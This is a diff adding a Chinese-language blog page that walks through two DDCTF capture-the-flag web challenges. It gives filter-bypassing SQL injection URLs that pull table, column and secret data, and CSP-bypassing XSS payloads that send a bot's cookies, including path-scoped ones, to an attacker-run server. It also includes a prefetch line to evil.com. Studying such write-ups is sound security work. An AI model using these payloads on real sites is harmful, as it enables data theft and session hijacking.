@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  
+  <title>ddctf 两道web题的Writeup (sqli &amp; xss) - Nearg1e</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script type="text/javascript" src="/js/highlight.pack.js"></script>
+  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=58637942" charset="UTF-8"></script>
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link rel="alternative" href="/atom.xml" title="Nearg1e" type="application/atom+xml">
+  
+  <!--[if lt IE 9]>
+    <script type="text/javascript" src="/js/html5.js"></script>
+    <script type="text/javascript" src="/js/css3-mediaqueries.js"></script>
+  <![endif]-->
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+
+</head>
+<body>
+    <header id="header">
+    <div class="nav-warp">
+      <nav id="nav" class="w">
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/atom.xml">RSS</a>
+        
+        <a id="nav-search" class="icon-search fr" onclick="show_search()" title="搜索"></a>
+        <div id="nav-search-input" class="hide">
+          <form class="search-form" onsubmit="return dispatch()">
+            <input type="hidden" id="site" value="site:http://blog.neargle.com">
+            <input type="text" id="q" class="input-text" name="q" placeholder="搜索">
+            <input type="submit" value="" class="input-submit">
+          </form>
+        </div>
+      </nav>
+    </div>
+    
+  </header>
+
+  <!-- <div id='wrap'> -->
+    <div id='outer'>
+      <section id="main"><article class="post">
+  <header class="post-head">
+    
+  
+    
+      <h1 class="post-title">ddctf 两道web题的Writeup (sqli &amp; xss)</h1>
+    
+  
+
+    
+<time datetime="2017-08-31T19:01:10.000Z" class="post-time">2017-09-01</time>
+
+  </header>
+  
+  <section class="post-content typo">
+    <p><em>更新两篇之前在其他地方发过的文章</em></p>
+<h2 id="sqli">sqli</h2><p>地址: <a href="http://118.190.134.8/t1/news.php?id=1" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1</a></p>
+<p>尝试sql注入，会发现过滤了’和空格等。使用<br><a href="http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1</a> 和 <a href="http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2</a> 判断注入存在，开始思考出数据的方法</p>
+<p><a href="http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5</a><br>判断字段数为4</p>
+<p><a href="http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4</a><br>发现过滤了逗号</p>
+<p>那就不好用union出数据了，可选择使用盲注出数据比如<code>(select%a0ascii(substr((select%a0TABLE_NAME%a0from%a0information_schema.tables%a0where%a0TABLE_TYPE%a0=%a0&quot;BASE%a0TABLE&quot;%a0limit%a01%a0OFFSET%a02)%a0from%a01%a0for%a01))=1)%23</code>。但是这里其实有一个union出数据的tip可以使用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql $&#62; select 1,2,3,4 Union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d&#10;+-----+-----+-----+-----+&#10;|   1 |   2 |   3 |   4 |&#10;|-----+-----+-----+-----|&#10;|   1 |   2 |   3 |   4 |&#10;+-----+-----+-----+-----+</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p><a href="http://118.190.134.8/t1/news.php?id=-1%0aUnion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=-1%0aUnion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d</a><br>判断2和3是出数据的点</p>
+<p>库名:<br><a href="http://118.190.134.8/t1/news.php?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(SELECT%0adatabase()))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(SELECT%0adatabase()))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d</a>)</p>
+<p>表:<br><a href="http://118.190.134.8/t1/news.php" target="_blank" rel="external">http://118.190.134.8/t1/news.php</a><br>?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(<br>SELECT%0agroup_concat(table_name)%0aFROM%0ainformation_schema.tables%0aWHERE%0atable_schema%0a=%0a0x7431<br>))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d)</p>
+<p>表中列：</p>
+<p><a href="http://118.190.134.8/t1/news.php" target="_blank" rel="external">http://118.190.134.8/t1/news.php</a><br>?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(<br>SELECT%0agroup_concat(column_name)%0aFROM%0ainformation_schema.columns%0aWHERE%0atable_schema%0a=%0a0x7431<br>))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d)</p>
+<p>有个列叫secret,但是这个waf的黑名单中(<code>http://118.190.134.8/t1/news.php?id=-1%a0union%a0(select%a0*%a0from%a0(select%a01)a%a0join%a0(select%a0
+(select%a0group_concat(secret)%a0from%a0news)
+)b%a0join%a0(select%a03)c%a0join%a0(select%a04)d)</code>触发waf)，这个就有点故意刁难你的意思了。也是ctf的常用套路。<br>怎么不用列名出列数据呢？这里有一个新的tip：</p>
+<p>select x.4 from (select 1,2,3,4)x</p>
+<p>这样就可以利用位置代替列名了，最后出flag的payload</p>
+<p><code>http://118.190.134.8/t1/news.php?id=-1%a0union%a0(select%a0*%a0from%a0(select%a01)a%a0join%a0(select%a0(select%0Ax.4%0Afrom%0A(select%0A*%0Afrom%0A(select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c%0Ajoin%0A(select%0A4)d%0AUNION%0Aselect%0A*%0Afrom%0Anews)x%0ALIMIT%0A1%0Aoffset%0A4))b%a0join%a0(select%a03)c%a0join%a0(select%a04)d)</code></p>
+<h2 id="xss">xss</h2><p>比起上一道题目xss更富有实战意义。</p>
+<p><a href="http://114.215.24.14/t2/" target="_blank" rel="external">http://114.215.24.14/t2/</a></p>
+<p>现在各种报错.<br>第一道坎是ctf管用套路, <code>verification code (substr(md5($_POST[&#39;code&#39;]),6,6)===&#39;417c85&#39;)</code>, 写个脚本跑一些md5出来用grep找即可</p>
+<p>判断是一个xss的盲打题，有csp.</p>
+<p>Content-Security-Policy:default-src ‘self’; script-src ‘self’</p>
+<p>利用evi1m0同学挖掘到的CSP bypass,在远程服务器上收到了bot的请求包。(csp bypass: <a href="http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html" target="_blank" rel="external">http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html</a>)</p>
+<link rel="prefetch" href="http://evil.com/aaaa">
+
+<p>这里你需要一个记录所有http请求包的HttpServer应用。我们需要查看程序请求包中的url和Referer等信息，例如：”<a href="https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735&quot;。" target="_blank" rel="external">https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735&quot;。</a></p>
+<p>我们可以根据log中的Referer找到BOT所访问的页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22:09:51] GET /ddctf? HTTP/1.1&#10;&#10;GET /ddctf? HTTP/1.1&#10;Connection: keep-alive&#10;Referer: http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=xxxxxxxxxxx&#10;Accept: */*&#10;Host: xxxxxxxx:8888&#10;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#10;Accept-Language: en-US,en;q=0.8&#10;Purpose: prefetch&#10;Accept-Encoding: gzip, deflate, sdch</span><br></pre></td></tr></table></figure>
+<p>Curl一下referer可知，该页面的所有内容就是我们提交的代码。这里需要一个脑洞，我们要用第一次提交内容来当js代码，获取Referer之后，提交第二次内容，包含第一次提交的js url，使得代码符合csp的限制并执行。</p>
+<p>第一次payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var n0t = document.createElement(&#34;link&#34;);n0t.setAttribute(&#34;rel&#34;, &#34;prefetch&#34;);n0t.setAttribute(&#34;href&#34;, &#34;//xxxxxx.com:8888/ddctf/?&#34; + document.cookie);document.body.appendChild(n0t);//&#60;link rel=&#39;prefetch&#39; href=&#39;http://xxxxxxx:8888/ddctf&#39;&#62;</span><br></pre></td></tr></table></figure>
+<p>拿到referer之后第二个payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script src=&#34;http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=xxxxxxxxxxx&#34;&#62;&#60;/script&#62;</span><br></pre></td></tr></table></figure>
+<p>这样我们就获取到了bot上面的cookie。使用cookie到message页面上一看，有一个url和一个hit。<a href="http://114.215.24.14/t2/f1ag_1s_h3r3/" target="_blank" rel="external">http://114.215.24.14/t2/f1ag_1s_h3r3/</a>, hit:setcookie(“flag”, “xxxxxxx”, path=”/t2/f1ag_1s_h3r3/“);</p>
+<p>页面内容：U need find it!!</p>
+<p>需要去获取path下的cookie,重新构造payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v = document.createElement(&#34;iframe&#34;);&#10;v.src=&#34;http://114.215.24.14/t2/f1ag_1s_h3r3/&#34;;&#10;document.body.appendChild(v);&#10;setTimeout(function()&#123;&#10;    var n0t = document.createElement(&#34;link&#34;);&#10;    n0t.setAttribute(&#34;rel&#34;, &#34;prefetch&#34;);&#10;    n0t.setAttribute(&#34;href&#34;, &#34;//xxxxxxxxx.com:8888/ddctf/?&#34; + encodeURI(v.contentWindow.document.cookie.toString()));&#10;    document.body.appendChild(n0t);&#10;&#125;,1000);&#10;//&#60;link rel=&#39;prefetch&#39; href=&#39;http://xxxxxxxxx.com:8888/ddctf&#39;&#62;</span><br></pre></td></tr></table></figure>
+<p>cookie内有flag。</p>
+<h2 id="thanks">thanks</h2><p>evi1m0</p>
+<h2 id="link">link</h2><p><a href="http://sec.didichuxing.com/DDCTF/2017.html#/" target="_blank" rel="external">http://sec.didichuxing.com/DDCTF/2017.html#/</a></p>
+<p><a href="http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html" target="_blank" rel="external">http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html</a></p>
+<p><a href="https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735" target="_blank" rel="external">https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735</a></p>
+
+    <p class="origin-url">本文URL： <a href="http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/index.html">http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/index.html</a></p>
+  </section>
+  
+  <footer class="post-foot">
+    <section class="post-foot-warp clear">
+      
+  <ul class="post-tag icon-tag fl">
+    
+      <li><a href="/tags/CTF/">#CTF</a></li>
+    
+  </ul>
+
+      
+    </section>
+  </footer>
+  
+</article>
+
+    
+<nav id="post-nav" class="clear">
+  
+    <a href="/2017/09/01/use-request-merging-to-bypass-referer-check/" id="post-nav-newer" class="post-nav-link-wrap fl" title="使用request merging bypass referer(jsonp) 检测">
+      <div class="post-nav-title">&laquo; 使用request merging bypass referer(jsonp) 检测</div>
+    </a>
+  
+  
+    <a href="/2017/04/12/Django-CVE-2017-7233-bypass-is-safe-url-and-CVE-2017-7233-serve-open-url/" id="post-nav-older" class="post-nav-link-wrap fr" title="Django的两则url跳转漏洞:CVE-2017-7233和CVE-2017-7234分析">
+      <div class="post-nav-title">Django的两则url跳转漏洞:CVE-2017-7233和CVE-2017-7234分析 &raquo;</div>
+    </a>
+  
+</nav>
+
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+    </div>
+  <!-- </div> -->
+    <footer id="footer">
+    <div class="foot-warp">
+      <p>© 2014 Nearg1e</p>
+    </div>
+  </footer>
+  <script src="/js/tools.js"></script>
+  
+  
+  <script>
+    var disqus_shortname = 'neargle';
+    
+    var disqus_url = 'http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  
+  
+</body>
+</html>
